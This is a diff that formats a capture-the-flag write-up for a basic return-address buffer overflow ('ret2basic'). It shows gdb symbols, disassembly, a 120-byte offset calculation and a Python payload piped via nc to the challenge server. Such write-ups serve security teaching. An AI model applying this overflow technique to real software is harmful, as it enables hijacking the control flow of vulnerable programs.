@@ -1,5 +1,8 @@
-Find "win" function address
+A very basic buffer overflow -> ovewrite return address exploitation challange. Goal was to execute "win" function and display flag. Below steps to exploit binary:
 
+1. Find "win" function address
+
+```
 gdb ret2basic
 
 Non-debugging symbols:
@@ -31,9 +34,11 @@ Non-debugging symbols:
 0x00000000004013d0  __libc_csu_fini
 0x00000000004013d8  _fini
 (gdb)
+```
 
-check vulnerable function overflow:
+2. Check vulnerable function overflow:
 
+```
 [0x00401215]> s sym.vuln
 [0x0040130f]> pd
             ;-- vuln:
@@ -50,9 +55,11 @@ check vulnerable function overflow:
             0x00401339      90             nop
             0x0040133a      c9             leave
             0x0040133b      c3             ret
+```
 
+3. Calculate buffer length:
 0x70 + 0x8 = 120 - buffer length 
 
-overflow stack frame to return to address of the function win
+Overflow stack frame to return to address of the function win
 
-(python -c "print 'A'*120 + '\x15\x12\x40'") | nc challenge.nahamcon.com 30384
+` (python -c "print 'A'*120 + '\x15\x12\x40'") | nc challenge.nahamcon.com 30384`
